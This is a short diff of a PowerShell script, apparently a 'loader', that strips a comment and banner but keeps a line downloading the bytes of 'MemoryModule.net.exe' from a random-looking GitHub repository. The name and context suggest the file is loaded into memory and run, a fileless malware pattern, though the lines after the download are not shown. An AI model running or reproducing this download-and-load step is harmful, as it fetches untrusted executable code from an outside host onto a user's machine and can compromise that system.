@@ -1,6 +1,3 @@
-# Save this as loadr.ps1 locally
-Write-Host "`n  exhale loader`n" -ForegroundColor DarkGray
-
 $bytes = (New-Object System.Net.WebClient).DownloadData(
     "https://github.com/ousdhfoudhoudhgiu/45yh/raw/refs/heads/main/MemoryModule.net.exe"
 )
